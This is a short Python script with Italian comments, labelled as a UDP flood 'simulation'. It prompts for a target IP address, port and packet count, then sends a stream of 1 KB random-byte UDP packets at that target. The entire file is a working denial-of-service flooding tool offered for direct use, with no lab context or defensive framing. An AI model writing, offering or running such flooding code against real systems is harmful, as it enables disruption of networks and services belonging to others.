import socket
import random
import time

def send_udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creazione del socket UDP
    packet_size = 1024  # 1 KB per pacchetto
    
    # Genera pacchetti casuali da 1 KB
    packet = random._urandom(packet_size)  # Genera byte casuali
    
    print(f"Inizio l'invio di {num_packets} pacchetti a {target_ip}:{target_port}...")
    
    for i in range(num_packets):
        try:
            sock.sendto(packet, (target_ip, target_port))  # Invia il pacchetto
            if (i + 1) % 100 == 0:
                print(f"Inviati {i + 1} pacchetti...")  # Feedback ogni 100 pacchetti
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto: {e}")
            break
    
    print(f"Invio completato di {num_packets} pacchetti.")

def main():
    print("Simulazione UDP Flood")
    
    # Input dell'utente
    target_ip = input("Inserisci l'IP del target: ")
    target_port = int(input("Inserisci la porta UDP del target: "))
    num_packets = int(input("Quanti pacchetti vuoi inviare? "))
    
    send_udp_flood(target_ip, target_port, num_packets)

if __name__ == "__main__":
    main()
